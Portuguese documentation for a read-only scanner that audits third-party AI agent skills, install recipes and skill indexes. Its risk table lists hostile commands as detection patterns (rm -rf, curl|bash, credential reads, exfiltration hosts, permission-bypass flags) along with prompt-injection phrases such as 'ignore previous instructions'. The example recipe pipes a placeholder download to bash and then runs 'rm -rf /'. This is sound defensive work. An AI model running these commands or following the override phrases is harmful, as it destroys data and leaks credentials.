# Confiança em skill de terceiro

Ler a ficha, varrer o risco, comparar a permissão declarada com a usada, conferir a instalação, auditar o índice e caçar duplicata — antes de deixar a skill rodar.

A camada parte de [`VoltAgent/awesome-openclaw-skills`](https://github.com/VoltAgent/awesome-openclaw-skills) — **MIT**, mais de 5.400 skills indexadas — e do `CONTRIBUTING` do mesmo repositório, que publica o formato da entrada e as regras de aceitação. Nenhuma das skills indexadas é baixada, importada ou executada: a leitura é lexical sobre o texto que você cola.

| Camada | O que faz | Toca a rede? |
|---|---|---|
| **Motor** (`server/confianca.py`, 7 skills) | Lê o SKILL.md, varre padrões de risco, compara permissões, confere a receita e audita o índice | **Não** — só o texto colado |
| **Página** (`/confianca`) | Aba por verbo, formulário por análise, métricas, evidência por linha e o parecer para copiar | Não |

O módulo reaproveita `server/review.py`: mesmos grupos (`must`, `should`, `nice`), mesmas contagens, veredito e Markdown. A saída é determinística — mesma entrada, mesmo parecer — e nenhuma skill abre link, baixa pacote, executa comando ou consulta modelo.

## As sete skills

| Rota | Entrada | O que devolve |
|---|---|---|
| `confianca.ficha` | SKILL.md inteiro (40 caracteres ou mais) | nome, descrição, licença, versão, autoria, ferramentas, variáveis de ambiente, binários e o que falta na ficha |
| `confianca.risco` | skill, receita ou README | nota de 0 a 100, nível e achado por padrão: comando destrutivo, download que executa, credencial, envio para fora, injeção, ofuscação e o resto |
| `confianca.permissao` | SKILL.md inteiro (60 caracteres ou mais) | matriz de oito capacidades com declarado × usado, permissão ociosa e capacidade usada sem declaração |
| `confianca.instalacao` | receita de instalação | versão fixa ou flutuante por comando, e os problemas que tiram a reprodutibilidade |
| `confianca.indice` | índice em Markdown | entradas, host do link, tamanho da descrição, duplicata, contagem por seção e as dez regras do próprio repositório |
| `confianca.duplicata` | índice em Markdown ou `nome;url;descrição` | nome repetido, link repetido, nome parecido, variação de teste e descrição igual |
| `confianca.regras` | nada | hosts aceitos, vocabulário de ferramentas, 15 padrões de risco, pesos, níveis, afirmações que exigem prova e as dez regras do índice |

Todas aceitam `modo` com `lite`, `full` (padrão) ou `ultra`. `lite` devolve só o que bloqueia, `full` inclui as correções e `ultra` inclui as perguntas que faltam para decidir. Texto acima de 200 mil caracteres é recusado, e o índice acima de 1.500 entradas é amostrado por prefixo — o recorte aparece em `metrics.truncado`.

## 1. A ficha

O formato aceito é o do ecossistema: bloco `---` no topo com `name`, `description`, `license`, `version`, `author` e `allowed-tools`, seguido do corpo. O leitor não depende de YAML: `chave: valor`, listas com `- item` e o objeto JSON em uma linha (`metadata: {"env": [...], "bins": [...]}`) são lidos direto. Requisitos de ambiente só são reconhecidos nessa forma com chaves `env`/`environment` e `bins`/`binaries`/`commands`.

| Campo | O que precisa ter |
|---|---|
| `name` | minúsculas, hífen, até 64 caracteres, igual ao diretório |
| `description` | o gatilho na primeira frase: o que faz e **quando** usar |
| `license` | MIT, Apache-2.0 ou o que for |
| `version` | semver, para fixar e comparar |
| `author` | quem responde pela manutenção |
| `allowed-tools` | lista exata, sem curinga |

A ficha é o primeiro filtro: skill sem descrição de gatilho nunca é escolhida pelo agente, e skill com `allowed-tools: "*"` pede mais do que precisa. O corpo abaixo de 200 caracteres não descreve procedimento nenhum.

| Achado | Peso | O que é |
|---|---|---|
| `sem-frontmatter` | must | o texto não abre com `---` |
| `sem-nome` | must | nome ausente |
| `nome-fora-do-padrao` | should | maiúscula, espaço ou símbolo fora do kebab-case (a correção sugere a forma certa) |
| `sem-descricao` | must | descrição ausente |
| `descricao-curta` | should | menos de 4 palavras |
| `descricao-longa` | should | mais de 40 palavras |
| `descricao-sem-gatilho` | nice | não diz quando usar (sem `use`, `usa`, `quando`, `when`, `para` ou `to`) |
| `sem-licenca` | should | sem licença declarada |
| `sem-autor` | should | sem responsável |
| `sem-versao` | nice | sem versão para fixar |
| `corpo-curto` | must | corpo com menos de 200 caracteres |

Métricas: campos preenchidos dos sete esperados, ferramentas, `env`, `bins`, palavras da descrição e caracteres do corpo.

## 2. O risco

Quinze padrões, cada um com classe, severidade, trecho e linha. A nota soma **18 por bloqueio, 7 por correção e 2 por sugestão**, com teto de 100; o nível sai da nota e do número de bloqueios: **baixo** (menos de 15, nenhum bloqueio), **moderado** (15 a 39), **alto** (um ou dois bloqueios, ou 40 a 69), **crítico** (três ou mais, credencial com envio, ou 70+).

| id | Classe | Grupo | Exemplo |
|---|---|---|---|
| `execucao-destrutiva` | destruição | must | `rm -rf`, `mkfs`, `dd if=`, `> /dev/sd` |
| `download-e-executa` | execução remota | must | `curl … \| bash`, `wget … \| python`, `iwr … \| iex` |
| `credencial` | credencial | must | `cat .env`, `id_rsa`, `~/.ssh/`, `~/.aws/`, keychain |
| `exfiltracao` | exfiltração | must | `webhook`, `pastebin`, `ngrok`, `t.me/`, `transfer.sh`, `interact.sh` |
| `injecao` | injeção | must | "ignore previous instructions", "não avise o usuário", "reveal system prompt" |
| `ofuscacao` | ofuscação | must | `base64 -d`, `eval(`, `exec(`, blob de 160+ caracteres, sequência de `\x` |
| `desliga-protecao` | proteção | must | `--dangerously-skip-permissions`, `--no-sandbox`, `NODE_TLS_REJECT_UNAUTHORIZED` |
| `segredo-em-claro` | segredo | must | `sk-…`, `ghp_…`, `AKIA…`, chave privada em claro |
| `privilegio` | privilégio | should | `sudo`, `runas`, `doas` |
| `persistencia` | persistência | should | `crontab`, `LaunchAgents`, `systemctl enable`, `.bashrc`, `authorized_keys` |
| `fora-do-workspace` | escrita | should | `/etc/`, `/usr/local/bin`, `~/.ssh`, `~/Library` |
| `auto-modificacao` | integridade | should | skill que reescreve o próprio `SKILL.md` |
| `telemetria` | telemetria | should | envio de métricas de uso sem declaração |
| `permissao-total` | permissão | should | `allowed-tools: "*"`, "acesso total" |
| `instalacao-silenciosa` | instalação | should | `npm install`, `pip install` dentro da skill |

Quatro afirmações também pontuam, porque entram no lugar da prova: `oficial` (must), `auditada` (must), `obrigatória` (should) e promessa de resultado — `10x`, "revolucionário", "o único que resolve" (should).

**Credencial lida e enviada para fora** no mesmo material sobe a nota para 85 no mínimo e injeta um bloqueio próprio (`credencial-exfiltrada`): é a assinatura de roubo de credencial, mesmo quando o texto chama de integração.

A varredura é lexical: pega o que está escrito, não o que o código faz em tempo de execução. Ausência de padrão não é atestado de segurança — é ausência de padrão no texto colado.

## 3. Permissão declarada e usada

Oito capacidades: execução, leitura, escrita, rede, navegador, mensagem, agendamento e delegação. Cada ferramenta declarada é mapeada para a capacidade que concede (`Bash` → execução, `WebFetch` → rede, `Read` → leitura, `Task` → delegação), e o corpo é varrido atrás de indício de uso — bloco cercado de shell, linha com `$`, código inline com binário conhecido ou flag, e padrão de subagente.

| Situação | Quando acontece | Peso |
|---|---|---|
| `ok` | declarada e usada | — |
| `ociosa` | declarada e não usada | `should` (`capacidade-ociosa`) |
| `nao-declarada` | usada e não declarada | `must` em execução, escrita, rede, navegador, agendamento e delegação; `should` em leitura e mensagem |
| `livre` | nem declarada nem usada | — |

Sem `allowed-tools` e com capacidade perigosa no corpo, o achado `sem-declaracao` é bloqueio: sem declaração não há como conceder o mínimo — o runtime libera tudo ou nada. O mesmo vale para `escopo-amplo` (`*`), `env-nao-declarado` (variável usada e fora dos requisitos), `bin-nao-declarado` e `ferramenta-desconhecida` (nome fora do vocabulário, que não pode ser mapeado).

## 4. Instalação

Lê a receita linha por linha e reconhece treze gerenciadores: `npm`/`npx`, `pnpm`, `yarn`, `pip`/`uv pip`, `uvx`/`uv tool install`, `brew`, `cargo`, `go install`, `git clone`, `docker run`/`pull`, `curl`, `wget` e `apt`/`dnf`/`apk`. Cada comando é classificado como **fixado** (versão, tag ou digest) ou **flutuante**.

| Achado | Peso | O que é |
|---|---|---|
| `executa-instalador` | must | download canalizado para o shell |
| `sudo-na-instalacao` | must | privilégio elevado para instalar skill |
| `script-de-instalacao` | must | `postinstall`, `preinstall` ou `prepare` no pacote |
| `versao-flutuante` | should | `@latest`, `pip install` sem `==`, clone sem tag |
| `clone-sem-tag` | should | `git clone` sem tag nem commit |
| `host-nao-registrado` | should | download fora de registro público conhecido |
| `instalacao-global` | should | `npm i -g`, `pnpm add -g` |
| `deprecado` | should | o texto diz que foi descontinuado |
| `sem-instalacao` | nice | nenhuma receita encontrada |

Nada é resolvido, baixado ou instalado: a receita é lida como texto e o parecer diz isso. Versão travada no texto não garante o que o gerenciador resolve hoje, e checksum só é conferido se estiver escrito ao lado do download.

## 5. O índice

As dez regras vêm do `CONTRIBUTING` do próprio repositório de origem — e o índice real as viola em escala: nas três categorias conferidas, 246 de 251 linhas apontam para `clawskills.sh`, o espelho que o próprio guia proíbe.

| Regra | Peso | Detecção |
|---|---|---|
| `host-fora-do-canonico` | must | link que não é `clawhub.ai` (ou `www.clawhub.ai`) |
| `sem-descricao` | must | linha sem frase depois do hífen |
| `link-invalido` | must | `http://`, espaço ou sem host |
| `duplicada` | must | mesmo link ou mesmo nome em duas linhas |
| `descricao-longa` | should | mais de 10 palavras |
| `descricao-vazada` | should | começa com `>`, `*`, `|`, `#` ou `**`, ou termina em vírgula, ponto e vírgula, reticências ou travessão |
| `nome-fora-do-padrao` | should | fora do kebab-case |
| `fora-do-escopo` | should | crypto, blockchain, DeFi, finanças |
| `contagem-divergente` | should | o `**N skills**` da seção não bate com as linhas |
| `linha-fora-do-formato` | should | começa com `- [` e não casa com `- [nome](url) - descrição` |

As métricas trazem entradas, seções, quantas têm descrição, média de palavras, longas, no host canônico, fora dele, duplicadas, vazadas e fora do escopo. Cada achado cita até três exemplos, e as primeiras 80 linhas problemáticas aparecem com número de linha e problema. A leitura é do Markdown colado: nenhum link é aberto e nenhuma contagem é conferida na fonte.

## 6. Duplicata

A comparação é de nome e descrição, não de comportamento:

| Achado | Peso | Regra |
|---|---|---|
| `nome-repetido` | must | mesmo nome normalizado em duas linhas |
| `link-repetido` | must | mesma URL (sem barra final, minúscula) em duas linhas |
| `nome-proximo` | should | distância de edição de até 2 entre nomes de 5 caracteres ou mais, no mesmo balde de inicial |
| `sufixo-de-clone` | should | `-test`, `-demo`, `-copy`, `-old`, `-v2` ao lado do nome base |
| `descricao-igual` | should | mesma frase em skills diferentes |

O índice de origem tem os dois casos: `clawdstrike` e `clawdstrike-test` com descrição idêntica, e `cleanup` e `kradleverse-cleanup` repetindo a mesma frase. Lista acima de 1.500 entradas é amostrada por prefixo para manter a conta linear, e o limite é declarado em `metrics.truncado`.

## 7. O catálogo de regras

`confianca.regras` devolve o que o motor usa, para que a regra não fique escondida no código: a fonte e a versão, os quatro hosts conhecidos e o canônico, o limite de dez palavras, as oito capacidades com rótulo, o vocabulário de ferramentas, os 15 padrões de risco com classe e grupo, os pesos, os quatro níveis, as quatro afirmações que exigem prova, as dez regras do índice, os limites de cada análise e os quatro itens deixados de fora.

## Exemplo

Com a receita abaixo:

```text
Rode `curl -s https://x/y.sh | bash` e depois `rm -rf /`.
```

`confianca.risco` devolve **nota 36, nível alto, 2 bloqueios** (`execucao-destrutiva` e `download-e-executa`), com o trecho e a linha de cada um. Já um índice de três entradas com host fora do canônico, nome repetido e uma descrição longa devolve **3 entradas, 1 no canônico, 2 fora, 1 duplicada, 1 longa, média de 6,3 palavras**, com um bloqueio por grupo.

## O que ficou de fora

As **5.400+ skills** do índice não foram baixadas nem importadas, e nenhuma descrição ou categoria de lá foi copiada. Também não há sandbox dinâmico, análise de AST, verificação de assinatura de pacote ou varredura de malware: o que a camada faz é ler o que a skill declara e o que o texto manda fazer, com evidência e linha. Risco real de execução continua exigindo sandbox, revisão de código e permissão mínima no runtime — que é o que `estacao` já faz do lado da execução.

## Atribuição

Código e documentação do upstream sob licença MIT, `Copyright (c) 2026 VoltAgent`. O texto integral está em [`docs/licenses/voltagent-awesome-openclaw-skills.txt`](licenses/voltagent-awesome-openclaw-skills.txt).

## Contrato

Toda resposta traz `executed: false`, `readOnly: true` e o `mode` herdado do `review`; o `analysis` é prefixado com `confianca.` e cada `limitations` declara o que a conferência não cobre. Nenhuma skill abre arquivo, chama a rede, executa comando ou consulta modelo — inclusive a de regras, que devolve o catálogo estático.
